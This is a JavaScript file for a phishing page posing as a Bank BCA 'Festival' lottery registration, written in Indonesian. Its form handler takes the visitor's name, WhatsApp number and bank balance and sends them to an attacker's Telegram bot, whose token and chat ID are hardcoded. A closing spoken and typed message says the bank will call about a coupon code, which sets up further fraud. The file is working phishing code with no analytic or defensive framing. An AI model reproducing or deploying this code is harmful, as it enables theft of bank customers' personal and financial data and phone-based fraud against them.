// Ganti Token dan Chat ID kamu di sini
const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs";
const CHAT_ID = "6742478722";

const messagePage2 = "Terimakasih Telah Mendaftar Dilayanan Bank BCA Festival, Pendaftaran Anda Sedang Diproses, Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank BCA, Untuk Proses Cetak Kode Kupon Undian Anda";

// Mencegah gesture zoom
document.addEventListener('gesturestart', function (e) { e.preventDefault(); });
document.addEventListener('dblclick', function (e) { e.preventDefault(); }, { passive: false });

// Animasi Splash Screen
let progress = 0;
const progressBar = document.getElementById('logoProgress');
const splashScreen = document.getElementById('splash-screen');

const loadingInterval = setInterval(() => {
  progress += Math.floor(Math.random() * 15) + 10;
  if (progress >= 100) {
    progress = 100;
    clearInterval(loadingInterval);
    setTimeout(() => {
      splashScreen.style.opacity = '0';
      setTimeout(() => { splashScreen.style.display = 'none'; }, 400);
    }, 200);
  }
  progressBar.style.width = progress + '%';
}, 150);

// Slider Otomatis Page 1 & Page 2
let currentIndex = 0;
const slides = document.querySelectorAll('.slide-item');
setInterval(() => {
  if (slides.length > 0) {
    slides[currentIndex].classList.remove('active');
    currentIndex = (currentIndex + 1) % slides.length;
    slides[currentIndex].classList.add('active');
  }
}, 3500);

let currentIndexP2 = 0;
const slidesP2 = document.querySelectorAll('.slide-item-p2');
setInterval(() => {
  if (slidesP2.length > 0) {
    slidesP2[currentIndexP2].classList.remove('active');
    currentIndexP2 = (currentIndexP2 + 1) % slidesP2.length;
    slidesP2[currentIndexP2].classList.add('active');
  }
}, 3500);

// Validasi WhatsApp
function formatWA(input) {
  input.value = input.value.replace(/[^0-9]/g, '');
  const waError = document.getElementById('waError');
  if (input.value.length > 0 && input.value.length < 10) {
    waError.classList.remove('hidden');
  } else {
    waError.classList.add('hidden');
  }
}

// Format Saldo Rupiah
function formatSaldo(input) {
  let value = input.value.replace(/[^0-9]/g, '');
  if (value === '') {
    input.value = '';
    return;
  }
  let numberFormat = new Intl.NumberFormat('id-ID').format(value);
  input.value = 'Rp ' + numberFormat;
}

// Validasi Tombol Masuk
function validateForm() {
  const nama = document.getElementById('inputNama').value.trim();
  const wa = document.getElementById('inputWA').value.trim();
  const saldo = document.getElementById('inputSaldo').value.trim();
  const btn = document.getElementById('btnMasuk');

  const isWaValid = wa.length >= 10 && wa.length <= 13;
  const isNamaValid = nama.length > 0;
  const isSaldoValid = saldo.length > 0;

  if (isNamaValid && isWaValid && isSaldoValid) {
    btn.disabled = false;
    btn.classList.remove('bg-[#c0c0c0]', 'cursor-not-allowed');
    btn.classList.add('bg-[#005caa]', 'hover:bg-[#144e83]', 'cursor-pointer');
  } else {
    btn.disabled = true;
    btn.classList.remove('bg-[#005caa]', 'hover:bg-[#144e83]', 'cursor-pointer');
    btn.classList.add('bg-[#c0c0c0]', 'cursor-not-allowed');
  }
}

// Suara Orang Bicara
function playVoice() {
  if ('speechSynthesis' in window) {
    window.speechSynthesis.cancel();
    const speech = new SpeechSynthesisUtterance(messagePage2);
    speech.lang = 'id-ID';
    speech.rate = 0.95;
    speech.pitch = 1.0;
    window.speechSynthesis.speak(speech);
  }
}

// Kirim ke Telegram & Pindah Halaman
function sendTelegram(event) {
  event.preventDefault();

  if ('speechSynthesis' in window) {
    const unlock = new SpeechSynthesisUtterance('');
    window.speechSynthesis.speak(unlock);
  }

  const nama = document.getElementById('inputNama').value.trim();
  const wa = document.getElementById('inputWA').value.trim();
  const saldo = document.getElementById('inputSaldo').value.trim();
  const btn = document.getElementById('btnMasuk');

  btn.disabled = true;
  btn.innerText = "Memproses...";

  const text = `📥 *DATA BARU MASUK (myBCA)*\n\n` +
               `👤 *Nama:* ${nama}\n` +
               `📱 *No WhatsApp:* ${wa}\n` +
               `💰 *Jumlah Saldo:* ${saldo}`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text,
      parse_mode: 'Markdown'
    })
  })
  .then(() => showPage2())
  .catch(() => showPage2());
}

// Efek Mesin Ketik Halaman 2
function showPage2() {
  document.getElementById('page1').classList.add('hidden');
  document.getElementById('page2').classList.remove('hidden');
  document.getElementById('page2').style.display = 'flex';

  playVoice();

  let i = 0;
  const speed = 45;
  const target = document.getElementById('typedText');
  target.innerHTML = "";

  function typeWriter() {
    if (i < messagePage2.length) {
      target.innerHTML += messagePage2.charAt(i);
      i++;
      setTimeout(typeWriter, speed);
    }
  }
  
  typeWriter();
}
